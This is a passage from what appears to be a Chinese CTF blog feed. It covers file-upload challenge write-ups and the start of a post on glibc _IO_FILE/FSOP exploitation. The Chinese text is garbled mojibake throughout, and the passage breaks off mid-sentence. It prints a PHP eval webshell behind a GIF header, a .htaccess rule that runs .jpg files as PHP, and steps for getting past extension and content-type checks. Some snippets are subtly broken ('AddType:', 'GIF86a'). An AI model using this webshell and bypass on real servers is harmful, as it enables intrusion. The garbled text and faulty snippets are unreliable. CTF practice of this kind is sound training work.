æ³•å€ŸåŠ©<code>.htaccess</code>æ¥æ˜¯ä¿®æ”¹æ–‡ä»¶è§£æäº†<ul><li><mark>ä½†æ˜¯<mark></mark></mark></li></ul></li></ul><blockquote><p>è®¸å¤šç½‘ç«™éƒ¨ç½²æ—¶ä¼šä½¿ç”¨ <strong>Apache</strong> å’Œ <strong>Nginx&#x2F;OpenResty</strong> ç»„åˆæ¶æ„ï¼Œä¾‹å¦‚ï¼š</p><ul><li>Apache ä½œä¸ºåç«¯åº”ç”¨å¤„ç† PHP æˆ–å…¶ä»–åŠ¨æ€å†…å®¹ã€‚</li><li>Nginx&#x2F;OpenResty ä½œä¸ºå‰ç«¯åå‘ä»£ç†ã€‚</li></ul><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼š</p><ul><li><strong>.htaccess</strong> æ–‡ä»¶å®é™…ä¸Šè¢« Apache è§£æå¹¶ç”Ÿæ•ˆã€‚</li><li>ä½ çš„ä¸Šä¼ ç›®å½•ç›´æ¥ç”± Apache å¤„ç†ï¼Œè€Œéç”± OpenRestyã€‚</li></ul><h4 id="éªŒè¯æ–¹æ³•ï¼š"><a href="#éªŒè¯æ–¹æ³•ï¼š" class="headerlink" title="éªŒè¯æ–¹æ³•ï¼š"></a><strong>éªŒè¯æ–¹æ³•ï¼š</strong></h4><ul><li><p>ä¸Šä¼ ä¸€ä¸ªæ˜æ˜¾ä¼šæš´éœ² Apache ä¿¡æ¯çš„ <code>.htaccess</code>ï¼Œä¾‹å¦‚ï¼š</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ErrorDocument</span> <span class="number">403</span> <span class="string">&quot;Apache Detected&quot;</span></span><br></pre></td></tr></table></figure></div><p>å¦‚æœè¿”å›çš„ä¿¡æ¯æ˜¯ </p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Apache</span> <span class="title class_">Detected</span></span><br></pre></td></tr></table></figure></div><p>ï¼Œè¯´æ˜åç«¯æ˜¯ Apacheã€‚</p></li></ul></blockquote><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206200818057.bmp"></p><ul><li>ooooooook!! æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹<code>.htaccess</code>æ¥ä¿®æ”¹æ–‡ä»¶è§£æï¼Œå¦‚ä¸‹ï¼š</li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AddType</span>: application/x-httpd-php .<span class="property">jpg</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206193736442.bmp"></p><p>ç„¶åå†æ¬¡ä¸Šä¼ ä¸€æ¬¡shell.jpgå³å¯ï¼Œè®¿é—®çœ‹ä¸€ä¸‹ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206201337073.bmp"></p><p>okï¼ŒæˆåŠŸè§£æä¸ºphpæ–‡ä»¶</p><h2 id="èšå‰‘è¿æ¥â¤ï¸â¤ï¸-1"><a href="#èšå‰‘è¿æ¥â¤ï¸â¤ï¸-1" class="headerlink" title="èšå‰‘è¿æ¥â¤ï¸â¤ï¸"></a>èšå‰‘è¿æ¥â¤ï¸â¤ï¸</h2><p>è·Ÿç¬¬ä¸€é¢˜æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿæ˜¯åœ¨æ ¹ç›®å½•ä¸‹é¢</p><h1 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h1><h2 id="å‰ç«¯æ–‡ä»¶åç¼€æ£€æŸ¥"><a href="#å‰ç«¯æ–‡ä»¶åç¼€æ£€æŸ¥" class="headerlink" title="å‰ç«¯æ–‡ä»¶åç¼€æ£€æŸ¥"></a>å‰ç«¯æ–‡ä»¶åç¼€æ£€æŸ¥</h2><ul><li>ä¸Šä¼ æ–‡ä»¶ï¼Œå‘ç°æœ‰é™åˆ¶ï¼Œä¸”é™åˆ¶æ˜¯ä»¥å¼¹çª—çš„å½¢å¼ç»™å‡ºï¼Œæˆ‘ä»¬æŸ¥çœ‹æºä»£ç ä¸­çš„&lt;script&gt;æ ‡ç­¾å†…å®¹:</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206202925943.bmp"></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;ç’‡çƒ½â‚¬å¤‹å«¨ç‘•ä½·ç¬‚æµ¼çŠµæ®‘é‚å›¦æ¬¢!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ç€¹æ°«ç®Ÿéä½½î†æ¶“å©ç´¶é¨å‹¬æƒæµ å‰è¢«é¨ï¿½</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//é»æ„¬å½‡æ¶“å©ç´¶é‚å›¦æ¬¢é¨å‹­è¢«é¨ï¿½</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//é’ã‚†æŸ‡æ¶“å©ç´¶é‚å›¦æ¬¢ç»«è¯²ç€·é„îˆšæƒéä½½î†æ¶“å©ç´¶</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;ç’‡ãƒ¦æƒæµ æœµç¬‰éä½½î†æ¶“å©ç´¶é”›å²ƒî‡¬æ¶“å©ç´¶jpgéŠ†ä¹¸ngéŠ†ä¹¬ifç¼æ’³ç†¬é¨å‹«æµ˜é—å›§æ«Œé”›ï¿½&quot;</span>;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>è¿™é‡Œå‘ç°æœ‰å¯¹æ–‡ä»¶åç¼€ç»è¡Œæ£€æŸ¥ï¼Œä½†æ˜¯è¿™åªæ˜¯æœåŠ¡å™¨ç«¯å‰ç«¯çš„æ£€æŸ¥ï¼Œæˆ‘ä»¬æŠ“åŒ…ä¹‹åä¿®æ”¹åç¼€å³å¯ï¼ŒæŠ“åŒ…ä¹‹åä¿®æ”¹çš„æ˜¯åç«¯çš„å†…å®¹ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206203130844.bmp"></p><ul><li>è®¿é—®æ£€æŸ¥ä¸€ä¸‹ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../image-20241206202750063.png" alt="image-20241206202750063"></p><h2 id="èšå‰‘è¿æ¥â¤ï¸â¤ï¸-2"><a href="#èšå‰‘è¿æ¥â¤ï¸â¤ï¸-2" class="headerlink" title="èšå‰‘è¿æ¥â¤ï¸â¤ï¸"></a>èšå‰‘è¿æ¥â¤ï¸â¤ï¸</h2><p>ä¸€æ ·çš„æ­¥éª¤ï¼Œflagä¹Ÿæ˜¯åœ¨æ ¹ç›®å½•ä¸‹é¢</p><h1 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h1><ul><li>ä¿®æ”¹æ–‡ä»¶åç¼€ç»•è¿‡æ£€æŸ¥</li><li>ä¿®æ”¹<code>Content-Type</code>ï¼Œå¸¸è§ä¿®æ”¹ä¸ºï¼š</li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">image/png</span><br><span class="line">image/jpeg</span><br></pre></td></tr></table></figure></div><ul><li>ç»•è¿‡å¯¹<code>&lt;?</code>çš„æ£€æŸ¥ï¼Œ<mark>phpç‰ˆæœ¬å¤§äº5.4<mark>ï¼ŒåŒæ—¶æ·»åŠ <code>GIF</code>å¤´ç»•è¿‡æ£€æŸ¥</mark></mark></li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">GIF86</span>a; </span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div><ul><li>ä¿®æ”¹<code>.htaccess</code>é…ç½®ç»•è¿‡ä¸è§£æphpæ–‡ä»¶ï¼Œ<mark>æ³¨æ„æ˜¯åœ¨<code>Apache</code>æœåŠ¡å™¨ä¸­ï¼Œé‡åˆ°çš„<code>openresty</code>æœåŠ¡å™¨å¯ç”¨ä¸‹åˆ—è¯­å¥æ£€æŸ¥æ˜¯å¦å«æœ‰<code>Apache</code></mark></li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ErrorDocument</span> <span class="number">403</span> <span class="string">&quot;Apache Detected&quot;</span></span><br></pre></td></tr></table></figure></div><p>è®¿é—®ä¹‹åå¦‚æœæ˜¾ç¤º<code>Apache Detected</code>å°±è¯´æ˜åŒ…å«æœ‰<code>Apache</code>ï¼Œå¯ä»¥ä¿®æ”¹<code>.htaccess</code></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AddType</span>: application/x-httpd-php .<span class="property">jpg</span> </span><br><span class="line"><span class="comment">// å³å°†.jpgæ–‡ä»¶è§£æä¸ºphpæ–‡ä»¶</span></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ©ç”¨_IO_FILEç»“æ„</title>
      <link href="/2024/12/05/%E5%88%A9%E7%94%A8-IO-FILE%E7%BB%93%E6%9E%84/"/>
      <url>/2024/12/05/%E5%88%A9%E7%94%A8-IO-FILE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒ<code>ã€ŠCTFç«èµ›æƒå¨æŒ‡å—(PWNç¯‡)ã€‹</code>,<code>ctf.wiki</code></p><p><a class="link" href="https://blog.xmcve.com/2022/08/14/%E5%AD%A6%E4%B8%8D%E5%AE%8C%E7%9A%84IO/#title-2">https://blog.xmcve.com/2022/08/14/%E5%AD%A6%E4%B8%8D%E5%AE%8C%E7%9A%84IO/#title-2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="1-FILEç»“æ„ä½“"><a href="#1-FILEç»“æ„ä½“" class="headerlink" title="1.FILEç»“æ„ä½“"></a>1.FILEç»“æ„ä½“</h1><p>æ–‡ç« :<a class="link" href="https://www.yuque.com/yuqueyonghupiiwso/gixo00/bekmilyu3sn6sh3e?singleDoc#">https://www.yuque.com/yuqueyonghupiiwso/gixo00/bekmilyu3sn6sh3e?singleDoc# <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ã€ŠFILEç»“æ„ã€‹</p><p>å¯ä»¥å‚è€ƒä¸Šé¢å†™çš„æ–‡ç« ï¼Œä¸‹é¢ç®€å•è¯´ä¸€ä¸‹å§ã€‚</p><h2 id="FILEç»“æ„ä½“"><a href="#FILEç»“æ„ä½“" class="headerlink" title="FILEç»“æ„ä½“"></a>FILEç»“æ„ä½“</h2><ul><li>FILEç»“æ„è¢«è¢«ä¸€ç³»åˆ—æµæ“ä½œå‡½æ•°(fopen(),fread,fclose()ç­‰)æ‰€ä½¿ç”¨ã€å¤§å¤šæ•°çš„FILEç»“æ„ä½“ä¿å­˜åœ¨å †ä¸Š(stdin,stdout,stderré™¤å¤–ï¼Œä½äºlibcæ•°æ®æ®µ)ï¼Œå…¶æŒ‡é’ˆåŠ¨æ€åˆ›å»ºå¹¶ç”±fopen()å‡½æ•°è¿”å›ã€‚åœ¨libcçš„2.23ç‰ˆæœ¬ä¸­ï¼Œè¿™ä¸ªç»“æ„ä½“æ˜¯<code>_IO_FILE_plus</code>ï¼ŒåŒ…å«äº†ä¸€ä¸ª<code>_IO_FILE</code>ç»“æ„ä½“å’Œä¸€ä¸ªæŒ‡å‘<code>_IO_jump_t</code>ç»“æ„ä½“çš„æŒ‡é’ˆã€‚</li></ul><p>æºç ç½‘å€ï¼š<a class="link" href="https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libioP.h#L307">https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libioP.h#L307 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class="line"><span class="comment">   This contains a pointer to the function jump table used.</span></span><br><span class="line"><span class="comment">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class="line"><span class="comment">   be used to smash to a pointer to a virtual function table. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><ul><li>vtableæŒ‡å‘çš„å‡½æ•°è·³è½¬è¡¨å…¶å®æ˜¯ä¸€ç§å…¼å®¹C++è™šå‡½æ•°çš„å®ç°ã€‚å½“ç¨‹åºå¯¹æŸä¸ªæµè¿›è¡Œæ“ä½œæ—¶ï¼Œä¼šè°ƒç”¨è¯¥æµå¯¹åº”çš„è·³è½¬è¡¨ä¸­çš„æŸä¸ªå‡½æ•°ã€‚</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><ul><li><p><strong>è¿›ç¨‹ä¸­çš„FILEç»“æ„é€šè¿‡_chainåŸŸæ„æˆä¸€ä¸ªé“¾è¡¨ï¼Œé“¾è¡¨å¤´éƒ¨ä¸º_IO_list_allå…¨å±€å˜é‡ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¾æ¬¡é“¾æ¥äº†stddrrã€stdoutå’Œstdinä¸‰ä¸ªæ–‡ä»¶æµï¼Œå¹¶å°†æ–°åˆ›å»ºçš„æµæ’å…¥åˆ°å¤´éƒ¨</strong>ã€‚</p></li><li><p>å¦å¤–ï¼Œ_IO_wide_dataä¹Ÿæ˜¯åé¢æ‰€éœ€è¦çš„</p></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#endi</span></span><br></pre></td></tr></table></figure></div><h1 id="2-FSOP"><a href="#2-FSOP" class="headerlink" title="2.FSOP"></a>2.FSOP</h1><ul><li>FSOPï¼ˆFile Stream Oriented Programmingï¼‰æ˜¯ä¸€ç§åŠ«æŒ_IO_list_allï¼ˆlibc.soä¸­çš„å…¨å±€å˜é‡ï¼‰æ¥ä¼ªé€ 